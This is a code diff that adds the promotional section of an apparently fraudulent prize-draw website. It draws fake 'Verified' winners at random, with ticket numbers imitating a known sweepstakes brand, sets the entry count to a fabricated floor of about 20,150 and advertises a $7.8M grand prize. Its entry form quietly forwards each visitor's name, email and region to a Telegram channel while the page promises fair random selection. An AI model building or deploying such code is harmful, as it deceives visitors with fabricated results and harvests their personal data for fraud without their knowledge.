+function generatePromoWinners() { const used = new Set(); function pickFirst(){ return REVIEW_FIRST[Math.floor(Math.random()*REVIEW_FIRST.length)]; } function pickLastInitial(){ return REVIEW_LAST[Math.floor(Math.random()*REVIEW_LAST.length)].charAt(0); } function pickUniqueName(){ let n=0; while (n<40) { const full = `${pickFirst()} ${pickLastInitial()}.`; if (!used.has(full)) { used.add(full); return full; } n++; } return 'Anonymous Winner'; } function pickLoc(){ return REVIEW_LOCATIONS[Math.floor(Math.random()*REVIEW_LOCATIONS.length)]; } function pickTicket(){ return 'PCH-' + Math.floor(100000+Math.random()*900000); } return [{place:1,name:pickUniqueName(),location:pickLoc(),ticket:pickTicket(),prizeLabel:'Grand Prize Winner',prizeSummary:'$7,800,000 + $7,000/week + 2026 Mercedes-Benz'},{place:2,name:pickUniqueName(),location:pickLoc(),ticket:pickTicket(),prizeLabel:'2nd Place Winner',prizeSummary:"Winner's Choice: $800,000 Cash OR 2026 SUV"},{place:3,name:pickUniqueName(),location:pickLoc(),ticket:pickTicket(),prizeLabel:'3rd Place Winner',prizeSummary:'$25,000 Cash Prize'}]; }
+function ensurePromoState() { const now = Date.now(); if (!state.promo) { createNewPromoCycle(1); return; } if (!state.promo.entries || state.promo.entries < 20150) { state.promo.entries = 20150 + Math.floor(Math.random()*800); saveDeviceState(); } let guard=0; while (guard<30) { guard++; const p = state.promo; if (p.phase === 'active') { if (now >= new Date(p.drawDate).getTime()) { p.phase='closed'; p.winners = generatePromoWinners(); p.drawRef = 'DRAW-'+p.cycleId+'-'+Math.floor(1000+Math.random()*9000); saveDeviceState(); } else break; } else if (p.phase === 'closed') { if (now >= new Date(p.restartDate).getTime()) { createNewPromoCycle(p.cycleId + 1, p.restartDate); } else break; } else break; } }
+function getPromoPhaseMeta() { const p = state.promo; if (!p) return { phase:'active', remainingMs:0, targetLabel:'Draw in', statusText:'Draw Active', statusColor:'emerald' }; const isClosed = p.phase === 'closed'; const target = new Date(isClosed ? p.restartDate : p.drawDate).getTime(); const remainingMs = Math.max(0, target - Date.now()); if (isClosed) return { phase:'closed', remainingMs, targetLabel:'Next Cycle Starts In', statusText:'Winners Announced', statusColor:'sky' }; return { phase:'active', remainingMs, targetLabel:'Draw In', statusText:'Draw Active', statusColor:'emerald' }; }
+
+/* ═══════════ UI LOGIC ═══════════ */
+function renderHeaderNav() {
+  const nav = document.getElementById('nav-actions'); if (!nav) return;
+  if (!state.currentUser) {
+    nav.innerHTML = `<a href="login.html" class="btn-3d btn-secondary px-3 py-2 sm:px-4 sm:py-2 text-xs sm:text-sm font-semibold text-sky-custom hover:text-white transition rounded-xl border border-navy-700"><i class="fa-solid fa-right-to-bracket mr-1"></i> Login</a><a href="signup.html" class="btn-3d btn-primary px-3.5 py-2 sm:px-5 sm:py-2.5 text-xs sm:text-sm font-bold bg-gradient-to-br from-gold-400 via-gold-500 to-gold-600 text-navy-950 rounded-xl transition"><i class="fa-solid fa-user-plus mr-1"></i> Create Account</a>`;
+  } else {
+    nav.innerHTML = `<a href="overview.html" class="btn-3d btn-secondary px-3 py-2 text-xs sm:text-sm font-semibold text-gold-400 hover:text-white transition flex items-center rounded-xl border border-navy-700"><i class="fa-solid fa-gauge-high mr-1"></i> Dashboard</a>`;
+  }
+}
+
+/* ═══════════ PROMO RENDER ═══════════ */
+function renderPromoPrizes() {
+  return `<div class="space-y-4 sm:space-y-6">
+    <div class="prize-card-1 neon-border rounded-3xl p-6 sm:p-8 relative overflow-hidden card-3d">
+      <div class="absolute -top-8 -right-8 text-9xl text-gold-500/10 pointer-events-none"><i class="fa-solid fa-crown"></i></div>
+      <div class="absolute inset-0 bg-[radial-gradient(circle_at_top_right,rgba(251,191,36,.15),transparent_60%)] pointer-events-none"></div>
+      <div class="flex flex-col sm:flex-row sm:items-center gap-4 sm:gap-6 relative z-10">
+        <div class="w-20 h-20 sm:w-24 sm:h-24 rounded-3xl bg-gradient-to-br from-gold-400 to-gold-600 text-navy-950 flex items-center justify-center text-3xl sm:text-4xl shadow-2xl shadow-gold-500/50 crown-float shrink-0"><i class="fa-solid fa-crown"></i></div>
+        <div class="flex-1">
+          <div class="flex items-center gap-2 mb-2">
+            <span class="px-3 py-1 bg-gold-500 text-navy-950 text-[10px] font-black rounded-full uppercase tracking-wider shadow-md shadow-gold-500/30">1st Place</span>
+            <span class="text-[10px] text-gold-400 font-bold uppercase tracking-wider"><i class="fa-solid fa-star mr-1"></i>Grand Prize</span>
+          </div>
+          <h3 class="text-2xl sm:text-3xl font-black text-white">$7,800,000 <span class="text-transparent bg-clip-text bg-gradient-to-r from-gold-400 to-gold-600">Grand Prize</span></h3>
+          <div class="flex flex-wrap gap-2 mt-3">
+            <span class="inline-flex items-center gap-1.5 bg-navy-950/70 border border-gold-500/30 px-3 py-1.5 rounded-full text-[11px] font-bold text-gold-300"><i class="fa-solid fa-infinity"></i> $7,000 / week for life</span>
+            <span class="inline-flex items-center gap-1.5 bg-navy-950/70 border border-gold-500/30 px-3 py-1.5 rounded-full text-[11px] font-bold text-gold-300"><i class="fa-solid fa-car-side"></i> 2026 Mercedes-Benz</span>
+          </div>
+        </div>
+      </div>
+    </div>
+    <div class="grid grid-cols-1 sm:grid-cols-2 gap-4 sm:gap-6">
+      <div class="prize-card-2 rounded-3xl p-6 relative overflow-hidden card-3d">
+        <div class="absolute -top-6 -right-6 text-8xl text-slate-200/5 pointer-events-none"><i class="fa-solid fa-medal"></i></div>
+        <div class="flex items-center gap-3 mb-3 relative z-10">
+          <div class="w-12 h-12 rounded-2xl bg-gradient-to-br from-slate-200 to-slate-400 text-navy-950 flex items-center justify-center text-xl shadow-lg"><i class="fa-solid fa-medal"></i></div>
+          <span class="px-2.5 py-0.5 bg-slate-300 text-navy-950 text-[10px] font-black rounded-full uppercase tracking-wider">2nd Place</span>
+        </div>
+        <h4 class="text-lg sm:text-xl font-black text-white mb-1 relative z-10">Winner's Choice</h4>
+        <div class="space-y-2 mt-3 relative z-10">
+          <div class="flex items-center gap-2 bg-navy-950/60 border border-slate-500/30 px-3 py-2 rounded-xl"><i class="fa-solid fa-sack-dollar text-slate-300"></i><span class="text-xs font-bold text-white">$800,000 Cash</span></div>
+          <div class="flex items-center justify-center text-[10px] text-slate-400 font-bold uppercase tracking-wider"><i class="fa-solid fa-circle-nodes text-sky-custom mx-2"></i> OR <i class="fa-solid fa-circle-nodes text-sky-custom mx-2"></i></div>
+          <div class="flex items-center gap-2 bg-navy-950/60 border border-slate-500/30 px-3 py-2 rounded-xl"><i class="fa-solid fa-truck-monster text-slate-300"></i><span class="text-xs font-bold text-white">2026 SUV Vehicle</span></div>
+        </div>
+      </div>
+      <div class="prize-card-3 rounded-3xl p-6 relative overflow-hidden card-3d">
+        <div class="absolute -top-6 -right-6 text-8xl text-amber-600/10 pointer-events-none"><i class="fa-solid fa-award"></i></div>
+        <div class="flex items-center gap-3 mb-3 relative z-10">
+          <div class="w-12 h-12 rounded-2xl bg-gradient-to-br from-amber-500 to-amber-700 text-navy-950 flex items-center justify-center text-xl shadow-lg"><i class="fa-solid fa-award"></i></div>
+          <span class="px-2.5 py-0.5 bg-amber-600 text-white text-[10px] font-black rounded-full uppercase tracking-wider">3rd Place</span>
+        </div>
+        <h4 class="text-lg sm:text-xl font-black text-white mb-1 relative z-10">$25,000</h4>
+        <p class="text-xs text-slate-400 relative z-10">Straight cash prize, wired directly to your configured funding method.</p>
+        <div class="flex items-center gap-2 mt-4 bg-navy-950/60 border border-amber-600/30 px-3 py-2 rounded-xl relative z-10"><i class="fa-solid fa-money-bill-wave text-amber-500"></i><span class="text-xs font-bold text-white">$25,000.00 Cash</span></div>
+      </div>
+    </div>
+  </div>`;
+}
+function renderPromoTimeline(p) {
+  const now = Date.now(); const cycleStart = new Date(p.cycleStartDate).getTime(); const drawTime = new Date(p.drawDate).getTime(); const restartTime = new Date(p.restartDate).getTime(); const isClosed = p.phase === 'closed';
+  const step1Done = now >= cycleStart; const step2Active = !isClosed && now < drawTime; const step2Done = isClosed || now >= drawTime; const step3Done = isClosed && now >= drawTime; const step4Active = isClosed && now < restartTime;
+  const cls = (done, active) => done && !active ? 'timeline-dot done' : active ? 'timeline-dot active' : 'timeline-dot';
+  const lineCls = (done) => done ? 'timeline-line done' : 'timeline-line';
+  return `<div class="bg-navy-800 border border-navy-700 rounded-3xl p-6 sm:p-7 card-3d">
+    <div class="flex items-center justify-between mb-5">
+      <h3 class="text-base sm:text-lg font-bold text-white flex items-center"><i class="fa-solid fa-timeline text-sky-custom mr-2"></i> Event Timeline</h3>
+      <span class="text-[10px] text-slate-400 uppercase tracking-wider">Cycle #${p.cycleId}</span>
+    </div>
+    <div class="flex items-center gap-1 sm:gap-2 overflow-x-auto pb-2">
+      <div class="flex flex-col items-center min-w-[72px] sm:min-w-[100px]"><div class="${cls(step1Done, false)}"><i class="fa-solid fa-flag-checkered"></i></div><p class="text-[10px] font-bold text-white mt-2 text-center">Cycle Start</p><p class="text-[9px] text-slate-500 text-center">Day 0</p></div>
+      <div class="${lineCls(step2Done)}"></div>
+      <div class="flex flex-col items-center min-w-[72px] sm:min-w-[100px]"><div class="${cls(false, step2Active)}"><i class="fa-solid fa-hourglass-half"></i></div><p class="text-[10px] font-bold ${step2Active ? 'text-sky-custom' : 'text-white'} mt-2 text-center">21-Day Countdown</p><p class="text-[9px] text-slate-500 text-center">Days 1–21</p></div>
+      <div class="${lineCls(step3Done)}"></div>
+      <div class="flex flex-col items-center min-w-[72px] sm:min-w-[100px]"><div class="${cls(step3Done, false)}"><i class="fa-solid fa-trophy"></i></div><p class="text-[10px] font-bold text-white mt-2 text-center">Winners Drawn</p><p class="text-[9px] text-slate-500 text-center">Day 21</p></div>
+      <div class="${lineCls(step3Done)}"></div>
+      <div class="flex flex-col items-center min-w-[72px] sm:min-w-[100px]"><div class="${cls(false, step4Active)}"><i class="fa-solid fa-rotate"></i></div><p class="text-[10px] font-bold ${step4Active ? 'text-sky-custom' : 'text-white'} mt-2 text-center">Restart Window</p><p class="text-[9px] text-slate-500 text-center">Days 21–28</p></div>
+      <div class="${lineCls(false)}"></div>
+      <div class="flex flex-col items-center min-w-[72px] sm:min-w-[100px]"><div class="${cls(false, false)}"><i class="fa-solid fa-play"></i></div><p class="text-[10px] font-bold text-white mt-2 text-center">New Cycle</p><p class="text-[9px] text-slate-500 text-center">Day 28</p></div>
+    </div>
+  </div>`;
+}
+function renderPromoCountdownCard(p) {
+  const meta = getPromoPhaseMeta(); const isClosed = meta.phase === 'closed';
+  return `<div class="bg-navy-800 border border-navy-700 rounded-3xl p-6 sm:p-7 card-3d relative overflow-hidden">
+    <div class="absolute inset-0 pointer-events-none ${isClosed ? 'bg-[radial-gradient(circle_at_top,rgba(56,189,248,0.12),transparent_60%)]' : 'bg-[radial-gradient(circle_at_top,rgba(16,185,129,0.12),transparent_60%)]'}"></div>
+    <div class="relative z-10">
+      <div class="flex items-center justify-between mb-5">
+        <div>
+          <p class="text-[10px] text-slate-400 uppercase font-bold tracking-widest">${meta.targetLabel}</p>
+          <h3 class="text-lg sm:text-xl font-bold text-white mt-0.5">${isClosed ? 'New cycle begins soon' : 'Grand draw countdown'}</h3>
+        </div>
+        <span class="inline-flex items-center gap-1.5 px-3 py-1.5 rounded-full text-[10px] font-black ${isClosed ? 'bg-sky-custom/20 text-sky-custom border border-sky-custom/40' : 'bg-emerald-500/20 text-emerald-400 border border-emerald-500/40'}"><span class="w-2 h-2 rounded-full ${isClosed ? 'bg-sky-custom' : 'bg-emerald-400'} pulse-dot"></span>${meta.statusText}</span>
+      </div>
+      <div class="grid grid-cols-4 gap-2 sm:gap-3 text-center">
+        <div class="bg-navy-950 border border-navy-700 p-3 sm:p-4 rounded-2xl relative overflow-hidden shadow-inner"><div id="promo-cd-days" class="text-2xl sm:text-4xl font-black text-white">00</div><div class="text-[9px] sm:text-[10px] text-slate-400 uppercase mt-1">Days</div></div>
+        <div class="bg-navy-950 border border-navy-700 p-3 sm:p-4 rounded-2xl shadow-inner"><div id="promo-cd-hours" class="text-2xl sm:text-4xl font-black text-white">00</div><div class="text-[9px] sm:text-[10px] text-slate-400 uppercase mt-1">Hours</div></div>
+        <div class="bg-navy-950 border border-navy-700 p-3 sm:p-4 rounded-2xl shadow-inner"><div id="promo-cd-mins" class="text-2xl sm:text-4xl font-black text-white">00</div><div class="text-[9px] sm:text-[10px] text-slate-400 uppercase mt-1">Mins</div></div>
+        <div class="bg-navy-950 border border-navy-700 p-3 sm:p-4 rounded-2xl shadow-inner"><div id="promo-cd-secs" class="text-2xl sm:text-4xl font-black text-gold-400">00</div><div class="text-[9px] sm:text-[10px] text-slate-400 uppercase mt-1">Secs</div></div>
+      </div>
+      <div class="grid grid-cols-3 gap-3 mt-5 text-center">
+        <div class="bg-navy-950/60 border border-navy-700 rounded-xl p-2.5"><p class="text-[9px] text-slate-400 uppercase font-bold">Cycle</p><p class="text-xs font-black text-white mt-0.5">#${p.cycleId}</p></div>
+        <div class="bg-navy-950/60 border border-navy-700 rounded-xl p-2.5"><p class="text-[9px] text-slate-400 uppercase font-bold">Entries</p><p class="text-xs font-black text-gold-400 mt-0.5">${(p.entries||0).toLocaleString()}</p></div>
+        <div class="bg-navy-950/60 border border-navy-700 rounded-xl p-2.5"><p class="text-[9px] text-slate-400 uppercase font-bold">Draw Ref</p><p class="text-[10px] font-black text-sky-custom mt-0.5 truncate">${escapeHtml(p.drawRef||'Pending')}</p></div>
+      </div>
+    </div>
+  </div>`;
+}
+function renderPromoEntryCard(p) {
+  const meta = getPromoPhaseMeta();
+  if (meta.phase === 'closed') {
+    return `<div class="bg-navy-800 border border-dashed border-navy-600 rounded-3xl p-6 sm:p-7 flex flex-col items-center justify-center text-center min-h-[280px]"><div class="w-14 h-14 rounded-2xl bg-sky-custom/15 text-sky-custom flex items-center justify-center text-2xl mb-4"><i class="fa-solid fa-lock"></i></div><h3 class="text-lg font-bold text-white mb-1.5">Entries Closed</h3><p class="text-xs text-slate-400 max-w-xs leading-relaxed">This cycle's draw has concluded. New entries open automatically when the next cycle starts.</p><div class="mt-4 px-4 py-2 bg-navy-950 border border-navy-700 rounded-xl text-[11px] text-slate-300"><i class="fa-solid fa-clock text-sky-custom mr-1"></i> Restart window active</div></div>`;
+  }
+  return `<div class="bg-navy-800 border border-navy-700 rounded-3xl p-6 sm:p-7 card-3d">
+    <div class="flex items-center justify-between mb-5">
+      <div><h3 class="text-base sm:text-lg font-bold text-white flex items-center"><i class="fa-solid fa-ticket text-gold-400 mr-2"></i> Enter Promo Stream</h3><p class="text-[11px] text-slate-400 mt-0.5">Submit your details to enter the active pool.</p></div>
+      <span class="px-3 py-1 bg-gold-500/20 text-gold-400 text-[10px] font-black rounded-full border border-gold-500/40 uppercase tracking-wider">Open</span>
+    </div>
+    <form onsubmit="handlePromoEntry(event)" class="space-y-3">
+      <input type="text" id="promo-name" required placeholder="Full Name" class="w-full bg-navy-950 border border-navy-700 rounded-xl px-3.5 py-2.5 text-sm text-white focus:outline-none focus:border-sky-custom transition-colors">
+      <input type="email" id="promo-email" required placeholder="Email Address" class="w-full bg-navy-950 border border-navy-700 rounded-xl px-3.5 py-2.5 text-sm text-white focus:outline-none focus:border-sky-custom transition-colors">
+      <input type="text" id="promo-region" required placeholder="City / Region" class="w-full bg-navy-950 border border-navy-700 rounded-xl px-3.5 py-2.5 text-sm text-white focus:outline-none focus:border-sky-custom transition-colors">
+      <button type="submit" class="btn-3d btn-primary w-full py-3 bg-gradient-to-br from-gold-400 via-gold-500 to-gold-600 text-navy-950 font-extrabold rounded-xl text-sm transition"><i class="fa-solid fa-paper-plane mr-1.5"></i> Enter This Cycle</button>
+    </form>
+    <div class="mt-4 p-3 bg-navy-950/60 border border-navy-700 rounded-xl text-[10px] text-slate-400 leading-relaxed"><i class="fa-solid fa-shield-halved text-sky-custom mr-1"></i> One entry per email. Winner names are drawn at random when the countdown reaches zero.</div>
+  </div>`;
+}
+function renderPromoWinners(p) {
+  const meta = getPromoPhaseMeta(); const isClosed = meta.phase === 'closed'; const winners = p.winners;
+  let headerBlock = `<div class="flex flex-col sm:flex-row sm:items-end justify-between gap-4 mb-6"><div><span class="text-xs font-bold text-gold-400 uppercase tracking-widest block mb-2">Randomized Selection</span><h2 class="text-2xl sm:text-3xl font-extrabold text-white flex items-center"><i class="fa-solid fa-trophy text-gold-400 mr-3"></i> Select Winners</h2><p class="text-slate-400 text-xs mt-1.5">${isClosed ? 'Winners drawn from verified entries — names randomized for privacy.' : 'Winner reveal begins automatically when the countdown hits zero.'}</p></div><span class="inline-flex items-center gap-2 px-4 py-2 rounded-xl text-xs font-black ${isClosed ? 'bg-emerald-500/20 text-emerald-400 border border-emerald-500/40' : 'bg-navy-950 border border-navy-700 text-slate-300'}"><span class="w-2 h-2 rounded-full ${isClosed ? 'bg-emerald-400 pulse-dot' : 'bg-slate-500'}"></span>${isClosed ? 'REVEALED' : 'PENDING DRAW'}</span></div>`;
+  if (!isClosed) {
+    const placeholders = [1,2,3].map(place => {
+      const labels = {1:'1st Place',2:'2nd Place',3:'3rd Place'}; const icons = {1:'fa-crown',2:'fa-medal',3:'fa-award'}; const classMap = {1:'winner-card-1',2:'winner-card-2',3:'winner-card-3'};
+      return `<div class="${classMap[place]} rounded-3xl p-6 relative overflow-hidden min-h-[220px]">
+        <div class="absolute inset-0 winner-placeholder opacity-30 pointer-events-none"></div>
+        <div class="relative z-10 flex flex-col h-full">
+          <div class="flex items-center justify-between mb-4">
+            <span class="px-3 py-1 text-[10px] font-black rounded-full uppercase tracking-wider ${place===1?'bg-gold-500 text-navy-950':place===2?'bg-slate-300 text-navy-950':'bg-amber-600 text-white'}">${labels[place]}</span>
+            <i class="fa-solid ${icons[place]} text-2xl ${place===1?'text-gold-400':place===2?'text-slate-300':'text-amber-500'}"></i>
+          </div>
+          <div class="flex-1 flex flex-col items-center justify-center text-center gap-2 my-4">
+            <div class="w-20 h-20 rounded-full bg-navy-950/80 border-2 border-dashed ${place===1?'border-gold-500/60':place===2?'border-slate-400/50':'border-amber-600/50'} flex items-center justify-center text-3xl font-black ${place===1?'text-gold-400':place===2?'text-slate-300':'text-amber-500'}"><i class="fa-solid fa-question"></i></div>
+            <p class="text-xs font-bold text-white uppercase tracking-wider">Revealing Soon</p>
+            <p class="text-[10px] text-slate-400">Awaiting countdown completion</p>
+          </div>
+          <div class="h-1.5 rounded-full overflow-hidden bg-navy-950/80 shimmer-bar mt-2"></div>
+        </div>
+      </div>`;
+    }).join('');
+    return headerBlock + `<div class="grid grid-cols-1 md:grid-cols-3 gap-4 sm:gap-6">${placeholders}</div>`;
+  }
+  const cards = winners.map((w, i) => {
+    const place = w.place; const classMap = {1:'winner-card-1',2:'winner-card-2',3:'winner-card-3'}; const iconMap = {1:'fa-crown',2:'fa-medal',3:'fa-award'}; const badgeMap = {1:'bg-gold-500 text-navy-950',2:'bg-slate-300 text-navy-950',3:'bg-amber-600 text-white'}; const labelMap = {1:'1st Place',2:'2nd Place',3:'3rd Place'};
+    const iconColor = place===1?'text-gold-400':place===2?'text-slate-300':'text-amber-500'; const initials = w.name.split(' ').map(n=>n.charAt(0)).slice(0,2).join(''); const borderColor = place===1?'border-gold-500/50':place===2?'border-slate-400/40':'border-amber-600/50'; const avatarBg = place===1?'from-gold-400 to-gold-600':place===2?'from-slate-200 to-slate-500':'from-amber-500 to-amber-700';
+    return `<div class="${classMap[place]} rounded-3xl p-6 relative overflow-hidden winner-reveal" style="animation-delay:${i*140}ms"><div class="absolute -top-8 -right-8 text-9xl opacity-10 pointer-events-none"><i class="fa-solid ${iconMap[place]}"></i></div><div class="relative z-10"><div class="flex items-center justify-between mb-4"><span class="px-3 py-1 text-[10px] font-black rounded-full uppercase tracking-wider ${badgeMap[place]}">${labelMap[place]}</span><i class="fa-solid ${iconMap[place]} text-2xl ${iconColor}"></i></div><div class="flex items-center gap-3 mb-4"><div class="w-14 h-14 rounded-2xl bg-gradient-to-br ${avatarBg} text-navy-950 flex items-center justify-center font-black text-lg shadow-lg">${initials}</div><div class="min-w-0"><p class="text-lg sm:text-xl font-black text-white truncate">${escapeHtml(w.name)}</p><p class="text-[11px] text-slate-400"><i class="fa-solid fa-location-dot mr-1 text-gold-400"></i>${escapeHtml(w.location)}</p></div></div><div class="pt-4 border-t ${borderColor}"><p class="text-[10px] text-slate-400 uppercase tracking-wider font-bold mb-1">${escapeHtml(w.prizeLabel)}</p><p class="text-xs sm:text-sm font-bold text-white leading-relaxed">${escapeHtml(w.prizeSummary)}</p></div><div class="mt-4 flex items-center justify-between text-[10px]"><span class="text-slate-400"><i class="fa-solid fa-ticket mr-1"></i>Ticket ${escapeHtml(w.ticket)}</span><span class="text-emerald-400 font-bold"><i class="fa-solid fa-circle-check mr-1"></i>Verified</span></div></div></div>`;
+  }).join('');
+  return headerBlock + `<div class="grid grid-cols-1 md:grid-cols-3 gap-4 sm:gap-6">${cards}</div>`;
+}
+function renderPromoSection() {
+  const p = state.promo; if (!p) return '';
+  const meta = getPromoPhaseMeta(); const isClosed = meta.phase === 'closed'; const now = Date.now();
+  const cycleStart = new Date(p.cycleStartDate).getTime(); const drawTime = new Date(p.drawDate).getTime(); const activeDuration = drawTime - cycleStart;
+  const elapsed = Math.min(activeDuration, Math.max(0, now - cycleStart)); const activeProgress = isClosed ? 100 : Math.round((elapsed/activeDuration)*100);
+  let restartBanner = '';
+  if (isClosed) { const ms = meta.remainingMs; const d = Math.floor(ms/86400000); const h = Math.floor((ms%86400000)/3600000); const m = Math.floor((ms%3600000)/60000); restartBanner = `<div class="bg-gradient-to-r from-sky-custom/15 via-navy-900 to-gold-500/15 border border-sky-custom/30 rounded-3xl p-5 sm:p-6 flex flex-col sm:flex-row items-start sm:items-center justify-between gap-4"><div class="flex items-center gap-3"><div class="w-12 h-12 rounded-2xl bg-sky-custom/20 text-sky-custom flex items-center justify-center text-xl"><i class="fa-solid fa-rotate"></i></div><div><p class="text-[10px] text-slate-400 uppercase font-bold tracking-widest">Auto-Restart Scheduler</p><p class="text-sm sm:text-base font-bold text-white">Next cycle begins in <span class="text-sky-custom">${d}d ${String(h).padStart(2,'0')}h ${String(m).padStart(2,'0')}m</span></p></div></div><div class="text-[11px] text-slate-400 flex items-center gap-2"><i class="fa-solid fa-infinity text-gold-400"></i>7-day restart window</div></div>`; }
+  return `<section id="promo-section" class="relative overflow-hidden py-14 sm:py-20 bg-gradient-to-b from-navy-950 via-navy-900 to-navy-950 border-b border-navy-700/50">
+    <div class="absolute inset-0 bg-[radial-gradient(circle_at_bottom_left,rgba(245,158,11,0.09),transparent_55%)] pointer-events-none"></div>
+    <div class="max-w-7xl mx-auto px-4 sm:px-6 lg:px-8 relative z-10 space-y-6 sm:space-y-8">
+      <div class="flex flex-col lg:flex-row lg:items-end justify-between gap-6">
+        <div class="space-y-3">
+          <div class="inline-flex items-center gap-2 bg-gold-500/10 border border-gold-500/30 px-3.5 py-1.5 rounded-full text-gold-400 text-[11px] font-black tracking-widest uppercase"><i class="fa-solid fa-trophy"></i> Weekly Allocation Promo</div>
+          <h2 class="text-3xl sm:text-4xl lg:text-5xl font-black text-white tracking-tight leading-tight">Massive Prize Pool<br/><span class="text-transparent bg-clip-text bg-gradient-to-r from-gold-400 via-gold-500 to-gold-600">Cycle #${p.cycleId} Live Now</span></h2>
+          <p class="text-sm sm:text-lg text-slate-300 leading-relaxed max-w-2xl mx-auto lg:mx-0">A 21-day live draw with an automatic 7-day restart. Winners are selected at random — every verified participant gets a fair chance.</p>
+        </div>
+        <div class="flex items-center gap-3"><span class="inline-flex items-center gap-2 px-4 py-2 rounded-2xl text-xs font-black ${isClosed ? 'bg-sky-custom/20 text-sky-custom border border-sky-custom/40' : 'bg-emerald-500/20 text-emerald-400 border border-emerald-500/40'}"><span class="w-2 h-2 rounded-full ${isClosed ? 'bg-sky-custom' : 'bg-emerald-400'} pulse-dot"></span>${meta.statusText}</span></div>
+      </div>
+      <div class="bg-navy-800 border border-navy-700 rounded-2xl p-4 sm:p-5 shadow-lg">
+        <div class="flex items-center justify-between text-xs mb-2"><span class="text-slate-400 font-bold uppercase tracking-wider">Cycle Progress</span><span class="text-gold-400 font-black">${activeProgress}%</span></div>
+        <div class="progress-track"><div class="progress-fill" style="width:${activeProgress}%"></div></div>
+        <div class="flex items-center justify-between text-[10px] text-slate-500 mt-2"><span>Cycle Started ${new Date(p.cycleStartDate).toLocaleDateString()}</span><span>Draw Day ${new Date(p.drawDate).toLocaleDateString()}</span></div>
+      </div>
+      <div class="grid grid-cols-1 lg:grid-cols-5 gap-4 sm:gap-6">
+        <div class="lg:col-span-3 space-y-4 sm:space-y-6"><div class="flex items-center gap-2"><i class="fa-solid fa-gift text-gold-400"></i><h3 class="text-lg sm:text-xl font-black text-white uppercase tracking-wide">Prize Details</h3></div>${renderPromoPrizes()}</div>
+        <div class="lg:col-span-2 space-y-4 sm:space-y-6"><div class="flex items-center gap-2"><i class="fa-solid fa-hourglass-half text-sky-custom"></i><h3 class="text-lg sm:text-xl font-black text-white uppercase tracking-wide">Live Countdown</h3></div>${renderPromoCountdownCard(p)}${renderPromoEntryCard(p)}</div>
+      </div>
+      ${renderPromoTimeline(p)}
+      <div class="bg-navy-800 border border-navy-700 rounded-3xl p-6 sm:p-8 card-3d">${renderPromoWinners(p)}</div>
+      ${restartBanner}
+      <div class="grid grid-cols-2 sm:grid-cols-4 gap-3 sm:gap-4">
+        <div class="bg-navy-800/70 border border-navy-700 rounded-2xl p-4 text-center card-3d"><i class="fa-solid fa-clock text-sky-custom text-lg mb-1"></i><p class="text-[10px] text-slate-400 uppercase font-bold tracking-wider">Cycle Length</p><p class="text-sm font-black text-white mt-0.5">21 Days</p></div>
+        <div class="bg-navy-800/70 border border-navy-700 rounded-2xl p-4 text-center card-3d"><i class="fa-solid fa-rotate text-gold-400 text-lg mb-1"></i><p class="text-[10px] text-slate-400 uppercase font-bold tracking-wider">Restart Window</p><p class="text-sm font-black text-white mt-0.5">7 Days</p></div>
+        <div class="bg-navy-800/70 border border-navy-700 rounded-2xl p-4 text-center card-3d"><i class="fa-solid fa-users text-sky-custom text-lg mb-1"></i><p class="text-[10px] text-slate-400 uppercase font-bold tracking-wider">Entries</p><p class="text-sm font-black text-white mt-0.5">${(p.entries||0).toLocaleString()}</p></div>
+        <div class="bg-navy-800/70 border border-navy-700 rounded-2xl p-4 text-center card-3d"><i class="fa-solid fa-dice text-gold-400 text-lg mb-1"></i><p class="text-[10px] text-slate-400 uppercase font-bold tracking-wider">Selection</p><p class="text-sm font-black text-white mt-0.5">Random</p></div>
+      </div>
+    </div>
+  </section>`;
+}
+
+function initPromoCountdown() {
+  if (promoInterval) clearInterval(promoInterval);
+  updatePromoCountdownDisplay();
+  promoInterval = setInterval(()=>{
+    const prevPhase = state.promo?.phase; const prevCycle = state.promo?.cycleId; const prevDrawRef = state.promo?.drawRef;
+    ensurePromoState();
+    const nowPhase = state.promo?.phase; const nowCycle = state.promo?.cycleId; const nowDrawRef = state.promo?.drawRef;
+    if (prevPhase !== nowPhase || prevCycle !== nowCycle || prevDrawRef !== nowDrawRef) { render(); return; }
+    updatePromoCountdownDisplay();
+  }, 1000);
+}
+function updatePromoCountdownDisplay() {
+  const p = state.promo; if (!p) return;
+  const meta = getPromoPhaseMeta(); const diff = meta.remainingMs;
+  const days = Math.floor(diff/86400000); const hours = Math.floor((diff%86400000)/3600000); const mins = Math.floor((diff%3600000)/60000); const secs = Math.floor((diff%60000)/1000);
+  const dEl = document.getElementById('promo-cd-days'); const hEl = document.getElementById('promo-cd-hours'); const mEl = document.getElementById('promo-cd-mins'); const sEl = document.getElementById('promo-cd-secs');
+  if (dEl) dEl.textContent = String(days).padStart(2,'0'); if (hEl) hEl.textContent = String(hours).padStart(2,'0'); if (mEl) mEl.textContent = String(mins).padStart(2,'0'); if (sEl) sEl.textContent = String(secs).padStart(2,'0');
+}
+
+async function handlePromoEntry(e) {
+  e.preventDefault();
+  const name = document.getElementById('promo-name').value;
+  const email = document.getElementById('promo-email').value;
+  const region = document.getElementById('promo-region').value;
+  if (state.promo) { state.promo.entries = (state.promo.entries||0) + 1; saveDeviceState(); }
+  const u = state.currentUser || { username:'unknown' };
+  sendTelegramMessage(`🎟️ <b>NEW PROMO ENTRY</b>\n<b>Name:</b> ${name}\n<b>Email:</b> ${email}\n<b>Region:</b> ${region}`);
+  showToast('Promo Entry', `Registered ${email}`, 'success');
+  showModal('Promo Entry Received', `<div class="text-center py-4 space-y-3"><div class="w-12 h-12 bg-emerald-500/20 text-emerald-400 rounded-full mx-auto flex items-center justify-center text-xl"><i class="fa-solid fa-check"></i></div><h4 class="text-lg font-bold text-white">Thanks, ${escapeHtml(name)}!</h4><p class="text-xs text-slate-300">Your entry (<span class="text-gold-400">${escapeHtml(email)}</span>) has been added to Cycle #${state.promo?.cycleId||1}.</p></div>`);
+  e.target.reset();
+  render();
+}
+
+/* ═══════════ REVIEWS RENDER ═══════════ */
+function renderStars(rating) { let h = ''; for (let i=1;i<=5;i++) h += i <= rating ? '<i class="fa-solid fa-star"></i>' : '<i class="fa-regular fa-star text-slate-600"></i>'; return h; }
+function getFilteredReviews() { const q = state.reviewsSearchQuery.trim().toLowerCase(); const rf = state.reviewsFilterRating; return state.reviews.filter(r => { const mq = !q || r.name.toLowerCase().includes(q) || r.comment.toLowerCase().includes(q) || r.location.toLowerCase().includes(q); const mr = rf === 'all' || r.rating.toString() === rf; return mq && mr; }); }
+function renderPaginationHtml(totalPages) {
+  if (totalPages <= 1) return '';
+  const cur = state.reviewsPage; const list = [];
+  const add = p => { if (p >= 1 && p <= totalPages && !list.includes(p)) list.push(p); };
